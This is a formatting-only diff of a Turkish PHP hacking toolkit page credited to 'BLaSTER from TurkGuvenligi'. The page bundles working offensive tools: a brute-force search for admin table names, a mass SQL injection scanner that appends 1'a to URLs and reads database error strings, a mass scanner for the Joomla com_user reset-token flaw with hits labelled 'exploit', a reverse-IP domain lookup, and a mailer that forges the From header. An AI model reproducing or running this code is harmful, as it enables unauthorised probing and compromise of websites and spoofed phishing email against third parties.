@@ -1,9 +1,9 @@
-<?PHP
+<?php
 /*
 Kodlama by BLaSTER
 from TurkGuvenligi
 */
-ini_set('max_execution_time',0);
+ini_set('max_execution_time', 0);
 ob_start();
 $tablo = "admin
 admins
@@ -120,26 +120,26 @@ font-style: italic;
               <input name="site" type=text size="40">
               <input type="submit" value="Tara">
               <br />
-              <?PHP
+              <?php
 $site=$_POST['site'];
-if($site){
-$ch=curl_init();
-curl_setopt($ch,CURLOPT_URL,"http://www.guerrilladns.com/index.php");
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
-curl_setopt($ch,CURLOPT_POST,1);
-curl_setopt($ch,CURLOPT_POSTFIELDS,"domain=".$site);
-$al=curl_exec($ch);
-curl_close($ch);
+if ($site) {
+    $ch=curl_init();
+    curl_setopt($ch, CURLOPT_URL, "http://www.guerrilladns.com/index.php");
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, "domain=".$site);
+    $al=curl_exec($ch);
+    curl_close($ch);
 
-preg_match_all('#rel="nofollow" >(.*?)</a>#si',$al,$ver);
+    preg_match_all('#rel="nofollow" >(.*?)</a>#si', $al, $ver);
 
 
-foreach($ver[1] as $cikti){
-ob_flush();
-flush();
-usleep(100000);
-echo $cikti.'<br>';
-}
+    foreach ($ver[1] as $cikti) {
+        ob_flush();
+        flush();
+        usleep(100000);
+        echo $cikti.'<br>';
+    }
 }
 ?>
             </p>
@@ -163,29 +163,30 @@ echo $cikti.'<br>';
             <input name="submit1" type="submit" id="submit1" value="Ara ve bul" />
             </label>
             <br />
-            <?PHP
+            <?php
 $tablo=htmlspecialchars($_POST['tablo']);
 $site=$_POST['site'];
 $refkod=$_POST['refkod'];
-if($site && $tablo && $refkod){
-$satirlar=explode("\n",$tablo);
-foreach($satirlar as $s){
-$son = $site." ".$s;
-$son2 = str_replace(" ","+",$son);
-$son3 = trim($son2);
-ob_flush();
-flush();
-usleep(100000);
-$ch=curl_init();
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
-curl_setopt($ch,CURLOPT_URL,$son3);
-$al=curl_exec($ch);
-curl_close($ch);
-if(eregi($refkod,$al)){
-echo $s . '--> <font color="red">yok</font><br>' ;
-}else{
-echo $s . '--> <font color="green">var</font><br>' ;}
-}
+if ($site && $tablo && $refkod) {
+    $satirlar=explode("\n", $tablo);
+    foreach ($satirlar as $s) {
+        $son = $site." ".$s;
+        $son2 = str_replace(" ", "+", $son);
+        $son3 = trim($son2);
+        ob_flush();
+        flush();
+        usleep(100000);
+        $ch=curl_init();
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_URL, $son3);
+        $al=curl_exec($ch);
+        curl_close($ch);
+        if (eregi($refkod, $al)) {
+            echo $s . '--> <font color="red">yok</font><br>' ;
+        } else {
+            echo $s . '--> <font color="green">var</font><br>' ;
+        }
+    }
 }
 ?>
           </form></td>
@@ -199,10 +200,10 @@ echo $s . '--> <font color="green">var</font><br>' ;}
             <strong>
             <input name="submit2" type="submit" id="submit2" value="Çevir" />
             <br />
-            <?PHP
+            <?php
   $hex=htmlspecialchars($_POST['hex']);
-if($hex){
-echo '0x'.bin2hex($hex);
+if ($hex) {
+    echo '0x'.bin2hex($hex);
 }
   ?>
             </strong></p>
@@ -217,12 +218,12 @@ echo '0x'.bin2hex($hex);
                 <input name="submit3" type="submit" id="submit3" value="Göster" />
               </label>
               <div align="left">
-                <?PHP
+                <?php
 $ip=htmlspecialchars($_POST['ip']);
-if($ip){
-$adres=gethostbyname($ip);
-echo '<font color="red">'.$ip.'</font> <br> <font color="green">'.$adres.'</font>';
-echo'<br> <a href="http://www.bing.com/search?q=ip%3A'.$adres.'+&go=&form=QBLH&filt=all" target="_blank">Bing arama sayfasini aç</a>';
+if ($ip) {
+    $adres=gethostbyname($ip);
+    echo '<font color="red">'.$ip.'</font> <br> <font color="green">'.$adres.'</font>';
+    echo'<br> <a href="http://www.bing.com/search?q=ip%3A'.$adres.'+&go=&form=QBLH&filt=all" target="_blank">Bing arama sayfasini aç</a>';
 }
 ?>
               </div>
@@ -238,10 +239,10 @@ echo'<br> <a href="http://www.bing.com/search?q=ip%3A'.$adres.'+&go=&form=QBLH&f
             </label>
             <span class="style4">
             <div align="left">
-              <?PHP
+              <?php
 $md5=htmlspecialchars($_POST['md5']);
-if($md5){
-echo md5($md5);
+if ($md5) {
+    echo md5($md5);
 }
 ?>
             </div>
@@ -257,27 +258,28 @@ echo md5($md5);
               <br />
               <input name="submit6" type="submit" id="submit6" value="Taramaya basla" />
               <br />
-              <?PHP
+              <?php
 $liste=htmlspecialchars($_POST['liste2']);
-if($liste){
-$satirlar=explode("\n",$liste);
-foreach($satirlar as $s){
-ob_flush();
-flush();
-usleep(100000);
-$cikti=trim($s);
-$ekle="/index.php?option=com_user&view=reset&layout=confirm";
-$bla=$cikti."".$ekle;
-$ch=curl_init();
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
-curl_setopt($ch,CURLOPT_URL,$bla);
-$al=curl_exec($ch);
-curl_close($ch);
-if(eregi('token',$al)){
-echo '<font color="green">'.$cikti.'</font> --> <font color="green"><a href="http://'.$bla.'" target="_blank">exploit</a></font><br>';
-}else{
-echo $cikti.' --> <font color="red">yok</font><br>';
-}}
+if ($liste) {
+    $satirlar=explode("\n", $liste);
+    foreach ($satirlar as $s) {
+        ob_flush();
+        flush();
+        usleep(100000);
+        $cikti=trim($s);
+        $ekle="/index.php?option=com_user&view=reset&layout=confirm";
+        $bla=$cikti."".$ekle;
+        $ch=curl_init();
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_URL, $bla);
+        $al=curl_exec($ch);
+        curl_close($ch);
+        if (eregi('token', $al)) {
+            echo '<font color="green">'.$cikti.'</font> --> <font color="green"><a href="http://'.$bla.'" target="_blank">exploit</a></font><br>';
+        } else {
+            echo $cikti.' --> <font color="red">yok</font><br>';
+        }
+    }
 }
 ?>
           </p>
@@ -288,41 +290,37 @@ echo $cikti.' --> <font color="red">yok</font><br>';
               <textarea name="liste1" cols="50" rows="8"></textarea>
               <input name="submit5" type="submit" id="submit5" value="Taramaya basla" />
               <br />
-              <?PHP
+              <?php
 $liste=htmlspecialchars($_POST['liste1']);
-if($liste){
-$satirlar=explode("\n",$liste);
-foreach($satirlar as $s){
-$tmz=trim($s);
-$son=$tmz.""."1'a";
-ob_flush();
-flush();
-usleep(100000);
-$ch=curl_init();
-curl_setopt($ch,CURLOPT_RETURNTRANSFER,TRUE);
-curl_setopt($ch,CURLOPT_URL,$son);
-$al=curl_exec($ch);
-curl_close($ch);
-if(eregi("Unclosed",$al)){
-echo $son.' <br> <font color="green">MSSQL</font><br>';
-}
-elseif(eregi("SQL syntax",$al)){
-echo $son.' <br> <font color="green">MySQL</font><br>';
-}
-elseif(eregi("MySQL",$al)){
-echo $son.' <br> <font color="green">MySQL</font><br>';
-}
-elseif(eregi("Syntax error",$al)){
-echo $son.' <br> <font color="green">Access</font><br>';
-}
-elseif(eregi("Access",$al)){
-echo $son.' <br> <font color="green">Access</font><br>';
-}
-elseif(eregi("JET Database",$al)){
-echo $son.' <br> <font color="green">Jet Db</font><br>';
-}else{
-echo $son.' <br> <font color="red">Yok</font><br>';
-}}
+if ($liste) {
+    $satirlar=explode("\n", $liste);
+    foreach ($satirlar as $s) {
+        $tmz=trim($s);
+        $son=$tmz.""."1'a";
+        ob_flush();
+        flush();
+        usleep(100000);
+        $ch=curl_init();
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_URL, $son);
+        $al=curl_exec($ch);
+        curl_close($ch);
+        if (eregi("Unclosed", $al)) {
+            echo $son.' <br> <font color="green">MSSQL</font><br>';
+        } elseif (eregi("SQL syntax", $al)) {
+            echo $son.' <br> <font color="green">MySQL</font><br>';
+        } elseif (eregi("MySQL", $al)) {
+            echo $son.' <br> <font color="green">MySQL</font><br>';
+        } elseif (eregi("Syntax error", $al)) {
+            echo $son.' <br> <font color="green">Access</font><br>';
+        } elseif (eregi("Access", $al)) {
+            echo $son.' <br> <font color="green">Access</font><br>';
+        } elseif (eregi("JET Database", $al)) {
+            echo $son.' <br> <font color="green">Jet Db</font><br>';
+        } else {
+            echo $son.' <br> <font color="red">Yok</font><br>';
+        }
+    }
 }
 ?>
           </p>
@@ -346,15 +344,19 @@ echo $son.' <br> <font color="red">Yok</font><br>';
             <br />
             <input name="submit62" type="submit" id="submit62" value="Gönder" />
             <br />
-            <?PHP
+            <?php
 $kim=$_POST['kim'];
 $kime=$_POST['kime'];
 $isim=$_POST['isim'];
 $baslik=$_POST['baslik'];
 $icerik=$_POST['icerik'];
-if($kim && $kime && $isim && $baslik && $icerik){
-$gonder=mail($kime, $baslik, $icerik, "From: ".$isim." <".$kim.">");
-if($gonder){echo'<script>alert("gonderildi..");</script>';}else{echo'<script>alert("uzgunum bi hata olustu..");</script>';}
+if ($kim && $kime && $isim && $baslik && $icerik) {
+    $gonder=mail($kime, $baslik, $icerik, "From: ".$isim." <".$kim.">");
+    if ($gonder) {
+        echo'<script>alert("gonderildi..");</script>';
+    } else {
+        echo'<script>alert("uzgunum bi hata olustu..");</script>';
+    }
 }
 ?>
           </p>
